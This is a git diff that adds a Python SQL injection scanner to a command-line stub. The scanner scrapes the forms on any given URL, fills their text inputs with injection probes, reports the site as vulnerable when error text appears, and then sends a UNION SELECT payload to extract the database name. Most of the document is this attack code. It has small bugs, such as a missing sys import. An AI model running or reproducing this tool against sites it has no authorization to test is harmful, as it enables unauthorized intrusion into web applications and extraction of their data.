@@ -1,19 +1,114 @@
 #!/usr/bin/env python3
 
+import requests
 import argparse
+import json
+from urllib.parse import urlparse, urljoin
+from bs4 import BeautifulSoup
+
+def is_valid_url(url):
+    parsed = urlparse(url)
+    return bool(parsed.netloc) and bool(parsed.scheme)
+
+def get_forms(url):
+    response = requests.get(url)
+    soup = BeautifulSoup(response.content, "html.parser")
+    return soup.find_all("form")
+
+def get_form_details(form):
+    details = {}
+    action = form.attrs.get("action").lower()
+    method = form.attrs.get("method", "get").lower()
+    inputs = []
+    for input_tag in form.find_all("input"):
+        input_type = input_tag.attrs.get("type", "text")
+        input_name = input_tag.attrs.get("name")
+        inputs.append({"type": input_type, "name": input_name})
+    details["action"] = action
+    details["method"] = method
+    details["inputs"] = inputs
+    return details
+
+def submit_form(form_details, url, payload, method):
+    target_url = urljoin(url, form_details["action"])
+    data = {}
+    for input_tag in form_details["inputs"]:
+        if input_tag["type"] == "text" or input_tag["type"] == "search":
+            data[input_tag["name"]] = payload
+        else:
+            data[input_tag["name"]] = "test"
+    if method == "POST":
+        return requests.post(target_url, data=data)
+    else:
+        return requests.get(target_url, params=data)
+
+
+def detect_sql_injection(url, payloads, method):
+    forms = get_forms(url)
+    results = {
+        "url": url,
+        "vulnerable": False,
+        "payloads": [],
+        "database_name": None
+    }
+
+    for form in forms:
+        form_details = get_form_details(form)
+        for payload in payloads:
+            method = method.upper()  # Convertit la méthode en majuscules
+            response = submit_form(form_details, url, payload, method)
+            if "sql" in response.text.lower() or "syntax" in response.text.lower():
+                results["vulnerable"] = True
+                results["payloads"].append({
+                    "payload": payload,
+                    "response": response.text
+                })
+                # Tentative de récupération du nom de la base de données
+                db_payload = f"' UNION SELECT database(), {', '.join(['NULL'] * (4 - 1))}-- "
+                db_response = submit_form(form_details, url, db_payload, method)
+                print(db_response.text)
+                if "database()" in db_response.text:
+                    soup = BeautifulSoup(db_response.content, 'html.parser')
+                    tables = [td.text for td in soup.find_all("td")]
+                    if tables:
+                        results["database_name"] = tables[0]
+                break
+        if results["vulnerable"]:
+            break
+
+    return results
+
+def save_results(results, output_file):
+    with open(output_file, 'w') as f:
+        json.dump(results, f, indent=4)
 
 def main():
-    parser = argparse.ArgumentParser(description='Process some options.')
-    parser.add_argument('url', type=str, help='URL to process')
-    parser.add_argument('-o', type=str, default='default_archive.zip', help='Archive file (default: default_archive.zip)')
-    parser.add_argument('-X', type=str, default='GET', choices=['GET', 'POST'], help='Type of request (default: GET)')
+    parser = argparse.ArgumentParser(description='Test for SQL injection vulnerabilities.')
+    parser.add_argument('url', type=str, help='URL to test')
+    parser.add_argument('-o', type=str, default='default_archive.json', help='Output file (default: default_archive.json)')
+    parser.add_argument('-X', type=str, default='GET', choices=['GET', 'POST'], help='HTTP method to use (default: GET)')
+
 
     args = parser.parse_args()
 
-    # Print the parsed arguments (you would replace this with your actual handling logic)
     print(f"URL: {args.url}")
-    print(f"Archive file: {args.o}")
-    print(f"Request type: {args.X}")
+    print(f"Output file: {args.o}")
+    print(f"Method: {args.X}")
+
+    if not is_valid_url(args.url):
+        print(f'Invalid URL: {args.url}')
+        sys.exit(2)
+
+    payloads = ["'", "\"", "`", "\\", "/*'*/", ")'"]
+    results = detect_sql_injection(args.url, payloads, args.X)
+    save_results(results, args.o)
+
+    if results["vulnerable"]:
+        print("The site is vulnerable to SQL injection.")
+        if results["database_name"]:
+            print(f"Database name: {results['database_name']}")
+    else:
+        print("The site is not vulnerable to SQL injection.")
 
 if __name__ == "__main__":
     main()
